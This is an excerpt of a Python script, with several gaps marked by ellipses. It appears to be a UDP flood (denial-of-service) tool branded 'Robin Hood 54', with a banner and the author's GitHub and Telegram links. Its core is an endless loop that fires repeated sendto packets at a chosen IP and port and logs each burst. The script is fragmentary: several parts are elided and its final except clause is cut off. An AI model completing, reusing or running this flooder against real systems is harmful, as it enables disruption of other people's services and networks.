...
user=open("us.txt","r").read().splitlines()
...
print('\033[91m')
logo = pyfiglet.figlet_format( 'Robin\nHood 54')
print(logo)
...
text(f'''   \033[2;32m     >>>  https://github.com/YeRobinHood54  
     >>>  http://t.me/Robin_Ye_54  
     >>>  Programmer: Robin Hood 54\n ''')
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print (f"\033[92m",time.ctime(time.time())," IP: ",str(ip)," Port: ",str(port),"\033[0m")
		except:
